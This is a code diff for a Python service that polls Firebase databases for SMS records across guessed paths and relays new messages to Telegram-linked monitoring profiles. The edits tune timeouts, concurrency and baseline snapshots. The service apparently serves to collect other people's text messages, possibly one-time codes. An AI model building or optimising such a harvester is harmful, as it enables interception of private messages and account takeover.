@@ -12,14 +12,17 @@ from typing import Any
 import httpx
 
 from app.database import Device, MonitorProfile, SessionLocal
-from app.firebase_client import _fetch_json, firebase_root_url, get_firebase_workers
+from app.firebase_client import _fetch_json, firebase_root_url, get_poll_workers
 from app.services import get_active_device, get_monitor_profile, save_sms
 
 logger = logging.getLogger(__name__)
 
 POLL_INTERVAL_SEC = 0.3
-POLL_FETCH_TIMEOUT_SEC = 5.0
-SNAPSHOT_TIMEOUT_SEC = 30.0
+POLL_FETCH_TIMEOUT_SEC = 4.0
+SNAPSHOT_TIMEOUT_SEC = 8.0
+MONITORING_START_SNAPSHOT_SEC = 6.0
+MAX_POLL_PATHS_PER_CYCLE = 36
+POLL_PROFILE_CONCURRENCY = 8
 SMS_PARENT_PATHS = ("clients", "client", "devices", "device", "users", "phones")
 SMS_CHILD_PATHS = (
     "sms",
@@ -417,7 +420,7 @@ async def _fetch_paths_parallel(
     if not paths:
         return [], []
 
-    semaphore = asyncio.Semaphore(get_firebase_workers())
+    semaphore = asyncio.Semaphore(get_poll_workers())
 
     async def fetch_one(path: str) -> tuple[str, list[dict[str, Any]]]:
         async with semaphore:
@@ -476,7 +479,7 @@ async def fetch_firebase_sms_for_device(
                 set_cached_sms_paths(device, hit_paths)
             return _dedupe_records(cached_records)
 
-    all_paths = _generate_sms_paths(device)
+    all_paths = _generate_sms_paths(device)[:MAX_POLL_PATHS_PER_CYCLE]
     all_records, hit_paths = await _fetch_paths_parallel(root, all_paths, timeout=timeout)
     if hit_paths:
         set_cached_sms_paths(device, hit_paths)
@@ -517,8 +520,10 @@ async def snapshot_firebase_sms_seen(
 
 
 def mark_monitoring_baseline_started(device: Device, profile: MonitorProfile, db=None) -> None:
-    """Deprecated — baseline is set only after snapshot completes."""
-    _ = (device, profile, db)
+    """Instant baseline marker — poll can run while full snapshot finishes in background."""
+    _set_baseline_sms_keys(device, set(), profile.started_at)
+    if db is not None:
+        db.commit()
 
 
 async def run_baseline_snapshot_background(telegram_user_id: int) -> None:
@@ -709,8 +714,14 @@ async def poll_monitoring_profiles_once() -> int:
     if not profile_ids:
         return 0
 
+    semaphore = asyncio.Semaphore(POLL_PROFILE_CONCURRENCY)
+
+    async def run_one(profile_id: int) -> int:
+        async with semaphore:
+            return await _poll_one_monitoring_profile(profile_id)
+
     results = await asyncio.gather(
-        *[_poll_one_monitoring_profile(profile_id) for profile_id in profile_ids],
+        *(run_one(profile_id) for profile_id in profile_ids),
         return_exceptions=True,
     )
     processed = 0
@@ -727,7 +738,7 @@ async def run_firebase_sms_poll_loop() -> None:
         try:
             count = await asyncio.wait_for(
                 poll_monitoring_profiles_once(),
-                timeout=POLL_FETCH_TIMEOUT_SEC + 10,
+                timeout=POLL_FETCH_TIMEOUT_SEC + 6,
             )
             if count:
                 logger.info("Firebase SMS poll delivered %s message(s)", count)
@@ -736,3 +747,20 @@ async def run_firebase_sms_poll_loop() -> None:
         except Exception as exc:
             logger.exception("Firebase SMS poll loop error: %s", exc)
         await asyncio.sleep(POLL_INTERVAL_SEC)
+        await asyncio.sleep(0)
+
+
+async def finish_monitoring_baseline(profile_id: int, device_id: int) -> int:
+    """Background full baseline scan — never block Telegram handlers."""
+    db = SessionLocal()
+    try:
+        profile = db.query(MonitorProfile).filter(MonitorProfile.id == profile_id).first()
+        device = db.query(Device).filter(Device.id == device_id).first()
+        if not profile or not device or not profile.is_monitoring:
+            return 0
+        return await snapshot_firebase_sms_seen(profile, device, db)
+    except Exception as exc:
+        logger.warning("Background baseline failed: %s", exc)
+        return 0
+    finally:
+        db.close()
